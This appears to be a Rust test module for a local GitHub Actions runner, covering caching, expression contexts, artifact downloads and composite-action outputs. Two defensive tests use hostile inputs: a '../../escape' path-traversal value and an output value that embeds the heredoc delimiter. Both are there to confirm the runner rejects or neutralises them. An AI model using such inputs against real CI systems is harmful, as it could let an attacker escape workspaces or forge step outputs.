        assert_eq!(result.status, StepStatus::Success);
        assert!(result.output.contains("Cache miss"));

        // The save should be deferred
        assert_eq!(pending.lock().unwrap().len(), 1);

        // Flush pending saves
        flush_pending_cache_saves(&pending, &cache_store).await;

        // Now a second restore should hit
        let workspace2 = tempfile::tempdir().unwrap();
        let restored = cache_store
            .restore("deps-abc123", &[], "node_modules", workspace2.path())
            .await;
        assert_eq!(restored, Some("deps-abc123".to_string()));
        assert!(workspace2.path().join("node_modules/pkg.json").exists());
    }

    #[test]
    fn needs_context_flows_through_expression_evaluation() {
        let mut needs_ctx = HashMap::new();
        let mut build_outputs = HashMap::new();
        build_outputs.insert("artifact".to_string(), "dist.tar.gz".to_string());
        needs_ctx.insert("build".to_string(), build_outputs);

        let mut needs_res = HashMap::new();
        needs_res.insert("build".to_string(), "success".to_string());

        let empty_env = HashMap::new();
        let empty_steps = HashMap::new();
        let empty_statuses = HashMap::new();
        let empty_secrets = HashMap::new();

        let ctx = crate::expression::ExpressionContext {
            env_context: &empty_env,
            step_outputs: &empty_steps,
            matrix_combination: &None,
            step_statuses: &empty_statuses,
            job_status: "success",
            secrets_context: &empty_secrets,
            needs_context: &needs_ctx,
            needs_results: &needs_res,
        };

        // Test needs.build.outputs.artifact
        let result = crate::expression::evaluate("needs.build.outputs.artifact", &ctx).unwrap();
        assert_eq!(
            result,
            crate::expression::ExprValue::String("dist.tar.gz".to_string())
        );

        // Test needs.build.result
        let result = crate::expression::evaluate("needs.build.result", &ctx).unwrap();
        assert_eq!(
            result,
            crate::expression::ExprValue::String("success".to_string())
        );

        // Test unknown needs job returns null
        let result = crate::expression::evaluate("needs.deploy.result", &ctx).unwrap();
        assert_eq!(result, crate::expression::ExprValue::Null);
    }

    #[test]
    fn step_outcome_conclusion_with_continue_on_error() {
        let mut step_statuses = HashMap::new();
        let mut job_status = "success".to_string();

        // Simulate a step that failed but had continue-on-error
        let result = StepResult {
            name: "lint".to_string(),
            status: StepStatus::Failure,
            output: String::new(),
            outcome: StepStatus::Failure,
            conclusion: StepStatus::Success,
        };
        record_step_status(Some("lint"), &result, &mut step_statuses, &mut job_status);

        // Job status should remain "success" because conclusion is Success
        assert_eq!(job_status, "success");

        let empty_env = HashMap::new();
        let empty_steps = HashMap::new();
        let empty_secrets = HashMap::new();
        let empty_needs = HashMap::new();
        let empty_needs_results = HashMap::new();

        let ctx = crate::expression::ExpressionContext {
            env_context: &empty_env,
            step_outputs: &empty_steps,
            matrix_combination: &None,
            step_statuses: &step_statuses,
            job_status: &job_status,
            secrets_context: &empty_secrets,
            needs_context: &empty_needs,
            needs_results: &empty_needs_results,
        };

        // outcome should be "failure" (raw result)
        let outcome = crate::expression::evaluate("steps.lint.outcome", &ctx).unwrap();
        assert_eq!(
            outcome,
            crate::expression::ExprValue::String("failure".to_string())
        );

        // conclusion should be "success" (after continue-on-error)
        let conclusion = crate::expression::evaluate("steps.lint.conclusion", &ctx).unwrap();
        assert_eq!(
            conclusion,
            crate::expression::ExprValue::String("success".to_string())
        );

        // success() should return true (job hasn't failed)
        let is_success = crate::expression::evaluate("success()", &ctx).unwrap();
        assert_eq!(is_success, crate::expression::ExprValue::Bool(true));
    }

    #[test]
    fn secrets_context_resolves_in_expressions() {
        let mut secrets = HashMap::new();
        secrets.insert("API_KEY".to_string(), "sk-12345".to_string());

        let empty_env = HashMap::new();
        let empty_steps = HashMap::new();
        let empty_statuses = HashMap::new();
        let empty_needs = HashMap::new();
        let empty_needs_results = HashMap::new();

        let ctx = crate::expression::ExpressionContext {
            env_context: &empty_env,
            step_outputs: &empty_steps,
            matrix_combination: &None,
            step_statuses: &empty_statuses,
            job_status: "success",
            secrets_context: &secrets,
            needs_context: &empty_needs,
            needs_results: &empty_needs_results,
        };

        let result = crate::expression::evaluate("secrets.API_KEY", &ctx).unwrap();
        assert_eq!(
            result,
            crate::expression::ExprValue::String("sk-12345".to_string())
        );

        // Unknown secret returns null
        let result = crate::expression::evaluate("secrets.UNKNOWN", &ctx).unwrap();
        assert_eq!(result, crate::expression::ExprValue::Null);
    }

    #[tokio::test]
    async fn download_artifact_rejects_path_traversal() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut dl_with = HashMap::new();
        dl_with.insert("name".to_string(), "my-artifact".to_string());
        dl_with.insert("path".to_string(), "../../escape".to_string());
        let step = make_step(
            "download",
            "actions/download-artifact@v4",
            Some(dl_with),
            HashMap::new(),
        );
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("escapes workspace"));
    }

    #[tokio::test]
    async fn download_artifact_all_when_name_empty() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        // Create and upload two artifacts
        std::fs::write(working_dir.path().join("a.txt"), "aaa").unwrap();
        std::fs::write(working_dir.path().join("b.txt"), "bbb").unwrap();

        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        artifact_store
            .upload("art-a", "a.txt", working_dir.path())
            .await
            .unwrap();
        artifact_store
            .upload("art-b", "b.txt", working_dir.path())
            .await
            .unwrap();

        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        // Download all (no name specified)
        let dl_with = HashMap::new();
        let step = make_step(
            "download-all",
            "actions/download-artifact@v4",
            Some(dl_with),
            HashMap::new(),
        );
        let dl_workspace = tempfile::tempdir().unwrap();
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: dl_workspace.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        assert!(result.output.contains("2 artifact(s)"));
        // Each artifact should be in its own subdirectory
        assert!(dl_workspace.path().join("art-a/a.txt").exists());
        assert!(dl_workspace.path().join("art-b/b.txt").exists());
    }

    #[tokio::test]
    async fn cache_step_rejects_empty_key() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut with = HashMap::new();
        with.insert("key".to_string(), String::new());
        with.insert("path".to_string(), "node_modules".to_string());
        let step = make_step("cache", "actions/cache@v4", Some(with), HashMap::new());
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("not provided"));
    }

    #[tokio::test]
    async fn cache_step_rejects_empty_path() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut with = HashMap::new();
        with.insert("key".to_string(), "deps-key".to_string());
        // path is missing entirely
        let step = make_step("cache", "actions/cache@v4", Some(with), HashMap::new());
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("not provided"));
    }

    #[tokio::test]
    async fn cache_step_multi_path_defers_all_paths() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        // Create two directories to cache
        std::fs::create_dir_all(working_dir.path().join("node_modules")).unwrap();
        std::fs::write(working_dir.path().join("node_modules/pkg.json"), "{}").unwrap();
        std::fs::create_dir_all(working_dir.path().join(".npm")).unwrap();
        std::fs::write(working_dir.path().join(".npm/cache.bin"), "data").unwrap();

        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut with = HashMap::new();
        with.insert("key".to_string(), "deps-multi".to_string());
        with.insert("path".to_string(), "node_modules\n.npm".to_string());
        let step = make_step("cache", "actions/cache@v4", Some(with), HashMap::new());
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        assert!(result.output.contains("Cache miss"));

        // Both paths should be deferred
        assert_eq!(pending.lock().unwrap().len(), 2);

        // Flush and verify both paths are saved
        flush_pending_cache_saves(&pending, &cache_store).await;

        let ws2 = tempfile::tempdir().unwrap();
        let hit = cache_store
            .restore("deps-multi", &[], "node_modules", ws2.path())
            .await;
        assert!(hit.is_some());
        assert!(ws2.path().join("node_modules/pkg.json").exists());

        let hit2 = cache_store
            .restore("deps-multi", &[], ".npm", ws2.path())
            .await;
        assert!(hit2.is_some());
        assert!(ws2.path().join(".npm/cache.bin").exists());
    }

    // --- additional build_needs_context tests ---

    #[test]
    fn build_needs_context_filters_to_declared_needs() {
        let mut all_outputs = HashMap::new();
        all_outputs.insert("build".to_string(), {
            let mut m = HashMap::new();
            m.insert("version".to_string(), "1.2.3".to_string());
            m
        });
        all_outputs.insert("lint".to_string(), {
            let mut m = HashMap::new();
            m.insert("status".to_string(), "ok".to_string());
            m
        });
        all_outputs.insert("deploy".to_string(), {
            let mut m = HashMap::new();
            m.insert("url".to_string(), "https://example.com".to_string());
            m
        });

        let mut all_results = HashMap::new();
        all_results.insert("build".to_string(), "success".to_string());
        all_results.insert("lint".to_string(), "success".to_string());
        all_results.insert("deploy".to_string(), "failure".to_string());

        // Job only declares needs: [build, lint]
        let job = Job {
            needs: Some(vec!["build".to_string(), "lint".to_string()]),
            ..make_job(None, None)
        };

        let (needs_out, needs_res) = build_needs_context(&job, &all_outputs, &all_results);
        assert_eq!(needs_out.len(), 2);
        assert!(needs_out.contains_key("build"));
        assert!(needs_out.contains_key("lint"));
        assert!(!needs_out.contains_key("deploy"));
        assert_eq!(needs_res.get("build").unwrap(), "success");
        assert_eq!(needs_res.get("lint").unwrap(), "success");
        assert!(!needs_res.contains_key("deploy"));
    }

    // --- additional aggregate_reusable_workflow_outputs tests ---

    #[test]
    fn aggregate_reusable_workflow_outputs_last_job_wins_on_collision() {
        let mut job_outputs = HashMap::new();
        job_outputs.insert("alpha".to_string(), {
            let mut m = HashMap::new();
            m.insert("result".to_string(), "from-alpha".to_string());
            m
        });
        job_outputs.insert("beta".to_string(), {
            let mut m = HashMap::new();
            m.insert("result".to_string(), "from-beta".to_string());
            m
        });

        let merged = aggregate_reusable_workflow_outputs(&job_outputs);
        // "beta" > "alpha" alphabetically, so beta's value wins
        assert_eq!(merged.get("result").unwrap(), "from-beta");
    }

    #[test]
    fn aggregate_reusable_workflow_outputs_empty_input() {
        let merged = aggregate_reusable_workflow_outputs(&HashMap::new());
        assert!(merged.is_empty());
    }

    #[tokio::test]
    async fn download_artifact_all_with_empty_store() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        // Download all with no artifacts uploaded — should succeed with 0 files
        let dl_with = HashMap::new();
        let step = make_step(
            "download-all",
            "actions/download-artifact@v4",
            Some(dl_with),
            HashMap::new(),
        );
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        assert!(result.output.contains("0 artifact(s)"));
    }

    #[test]
    fn process_workflow_commands_multiple_set_outputs() {
        let mut outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let masker = SecretMasker::new();

        process_workflow_commands(
            "::set-output name=a::1\n::set-output name=b::2\nnormal line\n::set-output name=a::overwritten\n",
            Some("step1"),
            &mut outputs,
            Some(&masker),
        );

        let step_out = outputs.get("step1").unwrap();
        assert_eq!(step_out.get("a").unwrap(), "overwritten");
        assert_eq!(step_out.get("b").unwrap(), "2");
    }

    #[test]
    fn process_workflow_commands_no_step_id_ignores_set_output() {
        let mut outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        // Without a step_id, ::set-output:: commands should be silently ignored
        process_workflow_commands("::set-output name=x::val\n", None, &mut outputs, None);
        assert!(outputs.is_empty());
    }

    #[test]
    fn propagate_composite_outputs_writes_to_github_output_file() {
        // Simulate a composite action with an outputs section that references
        // an internal step output via ${{ steps.build-msg.outputs.msg }}
        let action_yaml = r#"
name: Greet
outputs:
  message:
    description: The greeting
    value: ${{ steps.build-msg.outputs.msg }}
  static_val:
    description: A literal
    value: hello-literal
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();

        // Populate the composite's internal step outputs
        let mut composite_step_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let mut build_msg_outputs = HashMap::new();
        build_msg_outputs.insert("msg".to_string(), "Hi, World!".to_string());
        composite_step_outputs.insert("build-msg".to_string(), build_msg_outputs);

        let action_env = HashMap::new();

        // Create a temp file to act as the caller's GITHUB_OUTPUT
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let tmp_path = tmp.path().to_string_lossy().to_string();
        let mut caller_env = HashMap::new();
        caller_env.insert("GITHUB_OUTPUT".to_string(), tmp_path.clone());

        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "success",
        );

        // Read the GITHUB_OUTPUT file — it should contain the evaluated outputs
        let content = std::fs::read_to_string(&tmp_path).unwrap();
        assert!(
            content.contains("message=Hi, World!"),
            "Expected 'message=Hi, World!' in GITHUB_OUTPUT, got: {:?}",
            content
        );
        assert!(
            content.contains("static_val=hello-literal"),
            "Expected 'static_val=hello-literal' in GITHUB_OUTPUT, got: {:?}",
            content
        );
    }

    #[test]
    fn propagate_composite_outputs_no_outputs_section_is_noop() {
        let action_yaml = r#"
name: NoOutputs
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();
        let composite_step_outputs = HashMap::new();
        let action_env = HashMap::new();

        // No GITHUB_OUTPUT in env — should not panic
        let caller_env = HashMap::new();
        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "success",
        );
        // No assertion needed — just verifying it doesn't panic
    }

    #[test]
    fn propagate_composite_outputs_on_failure_writes_partial_outputs() {
        // Simulate a composite action where one step succeeded before a later step failed.
        // The output referencing the successful step should still be propagated.
        let action_yaml = r#"
name: PartialOutputs
outputs:
  greeting:
    description: From step that succeeded
    value: ${{ steps.ok-step.outputs.val }}
  missing:
    description: From step that never ran
    value: ${{ steps.never-ran.outputs.val }}
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();

        // Only the first step produced outputs
        let mut composite_step_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let mut ok_outputs = HashMap::new();
        ok_outputs.insert("val".to_string(), "partial-result".to_string());
        composite_step_outputs.insert("ok-step".to_string(), ok_outputs);
        // "never-ran" is intentionally absent

        let action_env = HashMap::new();

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let tmp_path = tmp.path().to_string_lossy().to_string();
        let mut caller_env = HashMap::new();
        caller_env.insert("GITHUB_OUTPUT".to_string(), tmp_path.clone());

        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "failure",
        );

        let content = std::fs::read_to_string(&tmp_path).unwrap();
        assert!(
            content.contains("greeting=partial-result"),
            "Expected 'greeting=partial-result' in GITHUB_OUTPUT, got: {:?}",
            content
        );
        // The missing step output should resolve to empty string, not panic
        assert!(
            content.contains("missing="),
            "Expected 'missing=' in GITHUB_OUTPUT, got: {:?}",
            content
        );
    }

    #[test]
    fn propagate_composite_outputs_nonexistent_step_resolves_empty() {
        // When an output value references a step that doesn't exist in the
        // composite_step_outputs map, it should resolve to an empty string
        // rather than panicking or erroring.
        let action_yaml = r#"
name: GhostStep
outputs:
  phantom:
    description: References a step that was never executed
    value: ${{ steps.ghost.outputs.result }}
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();

        let composite_step_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let action_env = HashMap::new();

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let tmp_path = tmp.path().to_string_lossy().to_string();
        let mut caller_env = HashMap::new();
        caller_env.insert("GITHUB_OUTPUT".to_string(), tmp_path.clone());

        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "success",
        );

        let content = std::fs::read_to_string(&tmp_path).unwrap();
        // Should write the key with an empty value, not skip or panic
        assert!(
            content.contains("phantom="),
            "Expected 'phantom=' in GITHUB_OUTPUT, got: {:?}",
            content
        );
    }

    #[test]
    fn propagate_composite_outputs_multiline_value_uses_heredoc() {
        // When an output value contains newlines, it must be written using
        // the heredoc format (key<<DELIM\nvalue\nDELIM) so that
        // parse_github_kv_file can read it back correctly.
        let action_yaml = r#"
name: MultiLine
outputs:
  body:
    description: A multiline value
    value: ${{ steps.gen.outputs.text }}
  single:
    description: A single-line value
    value: ${{ steps.gen.outputs.title }}
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();

        let mut composite_step_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let mut gen_outputs = HashMap::new();
        gen_outputs.insert("text".to_string(), "line1\nline2\nline3".to_string());
        gen_outputs.insert("title".to_string(), "hello".to_string());
        composite_step_outputs.insert("gen".to_string(), gen_outputs);

        let action_env = HashMap::new();

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let tmp_path = tmp.path().to_string_lossy().to_string();
        let mut caller_env = HashMap::new();
        caller_env.insert("GITHUB_OUTPUT".to_string(), tmp_path.clone());

        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "success",
        );

        let content = std::fs::read_to_string(&tmp_path).unwrap();

        // Multiline value should use heredoc format with ghadelimiter prefix
        assert!(
            content.contains("body<<ghadelimiter"),
            "Expected heredoc format with ghadelimiter for multiline value in GITHUB_OUTPUT, got: {:?}",
            content
        );

        // Single-line value should use simple key=value format
        assert!(
            content.contains("single=hello"),
            "Expected 'single=hello' in GITHUB_OUTPUT, got: {:?}",
            content
        );

        // Verify parse_github_kv_file can round-trip the multiline value
        let parsed = crate::github_env_files::parse_github_kv_file(&content);
        assert_eq!(
            parsed.get("body").map(|s| s.as_str()),
            Some("line1\nline2\nline3"),
            "parse_github_kv_file should round-trip the multiline value"
        );
        assert_eq!(
            parsed.get("single").map(|s| s.as_str()),
            Some("hello"),
            "parse_github_kv_file should round-trip the single-line value"
        );
    }

    #[test]
    fn propagate_composite_outputs_value_containing_eof_uses_unique_delimiter() {
        // When a multiline output value contains a line that is literally "ghadelimiter",
        // the function must pick a different delimiter to avoid premature termination.
        let action_yaml = r#"
name: EOFInValue
outputs:
  data:
    description: Value with EOF-like content
    value: ${{ steps.gen.outputs.blob }}
runs:
  using: composite
  steps: []
"#;
        let action_def: serde_yaml::Value = serde_yaml::from_str(action_yaml).unwrap();

        let mut composite_step_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let mut gen_outputs = HashMap::new();
        // Value that contains "ghadelimiter" as a standalone line
        gen_outputs.insert(
            "blob".to_string(),
            "before\nghadelimiter\nafter".to_string(),
        );
        composite_step_outputs.insert("gen".to_string(), gen_outputs);

        let action_env = HashMap::new();

        let tmp = tempfile::NamedTempFile::new().unwrap();
        let tmp_path = tmp.path().to_string_lossy().to_string();
        let mut caller_env = HashMap::new();
        caller_env.insert("GITHUB_OUTPUT".to_string(), tmp_path.clone());

        let working_dir = std::env::temp_dir();

        propagate_composite_outputs(
            &action_def,
            &composite_step_outputs,
            &action_env,
            &caller_env,
            &working_dir,
            "success",
        );

        let content = std::fs::read_to_string(&tmp_path).unwrap();

        // The delimiter must NOT be "ghadelimiter" since the value contains it
        assert!(
            !content.starts_with("data<<ghadelimiter\n")
                || content.starts_with("data<<ghadelimiter_"),
            "Delimiter should have been suffixed to avoid collision, got: {:?}",
            content
        );

        // Verify parse_github_kv_file can round-trip the value correctly
        let parsed = crate::github_env_files::parse_github_kv_file(&content);
        assert_eq!(
            parsed.get("data").map(|s| s.as_str()),
            Some("before\nghadelimiter\nafter"),
            "parse_github_kv_file should round-trip value containing the base delimiter"
        );
    }

    #[test]
    fn generate_heredoc_delimiter_avoids_collisions() {
        // Base case: no collision
        let delim = generate_heredoc_delimiter("hello\nworld");
        assert_eq!(delim, "ghadelimiter");

        // Value contains the base delimiter as a line
        let delim = generate_heredoc_delimiter("line1\nghadelimiter\nline2");
        assert_eq!(delim, "ghadelimiter_1");

        // Value contains both base and _1
        let delim = generate_heredoc_delimiter("ghadelimiter\nghadelimiter_1\nother");
        assert_eq!(delim, "ghadelimiter_2");
    }
}
